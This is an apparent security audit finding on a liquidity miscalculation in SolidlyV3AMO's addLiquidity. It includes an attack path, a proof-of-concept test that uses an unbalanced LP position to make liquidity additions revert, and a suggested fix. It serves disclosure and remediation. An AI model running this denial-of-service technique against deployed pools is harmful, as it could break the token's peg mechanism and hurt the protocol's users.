# Liquidity is incorrectly calculated during `addLiquidity()` for SolidlyV3AMO, causing DoS.


### Summary

SolidlyV3 has the same liquidity calculation as UniswapV3. Currently, when adding liquidity, the liquidity calculation is wrong, and may lead to DoS in some cases.

### Root Cause

When calling `addLiquidity`, the amount of liquidity that is suppose to add is calculated by `liquidity = (usdAmount * currentLiquidity) / IERC20Upgradeable(usd).balanceOf(pool);`. This is incorrect in the terms of UniswapV3, because there may be multiple tickLower/tickUpper positions covering the current tick.

Also, since anyone can add a LP position to the pool, so attackers can easily DoS this function.

Consider an attacker adds an unbalanced LP position that deposits a lot of Boost tokens but doesn't deposit USD tokens. This would increase the total liquidity, and inflate the amount of `liquidity` calculated in the above formula, which would lead to an increase of USD tokens required to mint the liquidity.

When the amount of requried USD token is above the approved `usdAmount`, the liquidity minting would fail.

See the following PoC section for a more detailed example.

```solidity
    function _addLiquidity(
        uint256 usdAmount,
        uint256 minBoostSpend,
        uint256 minUsdSpend,
        uint256 deadline
    ) internal override returns (uint256 boostSpent, uint256 usdSpent, uint256 liquidity) {
        // Calculate the amount of BOOST to mint based on the usdAmount and boostMultiplier
        uint256 boostAmount = (toBoostAmount(usdAmount) * boostMultiplier) / FACTOR;

        // Mint the specified amount of BOOST tokens to this contract's address
        IMinter(boostMinter).protocolMint(address(this), boostAmount);

        // Approve the transfer of BOOST and USD tokens to the pool
        IERC20Upgradeable(boost).approve(pool, boostAmount);
@>      IERC20Upgradeable(usd).approve(pool, usdAmount);

        (uint256 amount0Min, uint256 amount1Min) = sortAmounts(minBoostSpend, minUsdSpend);

@>      uint128 currentLiquidity = ISolidlyV3Pool(pool).liquidity();
@>      liquidity = (usdAmount * currentLiquidity) / IERC20Upgradeable(usd).balanceOf(pool);

        // Add liquidity to the BOOST-USD pool within the specified tick range
        (uint256 amount0, uint256 amount1) = ISolidlyV3Pool(pool).mint(
            address(this),
            tickLower,
            tickUpper,
            uint128(liquidity),
            amount0Min,
            amount1Min,
            deadline
        );
        ...
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

Attackers can brick addLiquidity function by depositing LP.

### Impact

Attackers can deposit LP to make add liquidity fail, which also makes `mintSellFarm()` fail. This is an important feature to keep Boost/USD pegged, thus a high severity issue.

This is basically no cost for attackers since the Boost/USD will always go back to 1:1 so no impermanent loss is incurred.

### PoC

Add the following code in SolidlyV3AMO.test.ts. It does the following:

1. Add unbalanced liquidity so that total liquidity increases, but USD.balanceOf(pool) does not increase.
2. Mint some USD to SolidlyV3AMO for adding liquidity.
3. Try to add liquidity, but it fails due to incorrect liquidity calculation (tries to add too much liquidity for not enough USD tokens).

```solidity
      it("Should execute addLiquidity successfully", async function() {
        // Step 1: Add unbalanced liquidity so that total liquidity increases, but USD.balanceOf(pool) does not increase.
        {
          // -276325 is the current slot0 tick.
          console.log(await pool.slot0());
          await boost.connect(boostMinter).mint(admin.address, boostDesired * 100n);
          await testUSD.connect(boostMinter).mint(admin.address, usdDesired * 100n);
          await boost.approve(poolAddress, boostDesired * 100n);
          await testUSD.approve(poolAddress, usdDesired * 100n);
          console.log(await boost.balanceOf(admin.address));
          console.log(await testUSD.balanceOf(admin.address));
          await pool.mint(
            amoAddress,
            -276325 - 10,
            tickUpper,
            liquidity * 3n,
            0,
            0,
            deadline
          );
          console.log(await boost.balanceOf(admin.address));
          console.log(await testUSD.balanceOf(admin.address));
        }

        // Step 2: Mint some USD to SolidlyV3AMO for adding liquidity.
        await testUSD.connect(admin).mint(amoAddress, ethers.parseUnits("1000", 6));
        const usdBalance = await testUSD.balanceOf(amoAddress);

        // Step 3: Add liquidity fails due to incorrect liquidity calculation.
        await expect(solidlyV3AMO.connect(amo).addLiquidity(
          usdBalance,
          1,
          1,
          deadline
        )).to.emit(solidlyV3AMO, "AddLiquidity");
      });
```

### Mitigation

Use the UniswapV3 library for calculating liquidity: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/LiquidityAmounts.sol#L56

```solidity
    function getLiquidityForAmounts(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint256 amount0,
        uint256 amount1
    ) internal pure returns (uint128 liquidity) {
        if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        if (sqrtRatioX96 <= sqrtRatioAX96) {
            liquidity = getLiquidityForAmount0(sqrtRatioAX96, sqrtRatioBX96, amount0);
        } else if (sqrtRatioX96 < sqrtRatioBX96) {
            uint128 liquidity0 = getLiquidityForAmount0(sqrtRatioX96, sqrtRatioBX96, amount0);
            uint128 liquidity1 = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioX96, amount1);

            liquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1;
        } else {
            liquidity = getLiquidityForAmount1(sqrtRatioAX96, sqrtRatioBX96, amount1);
        }
    }
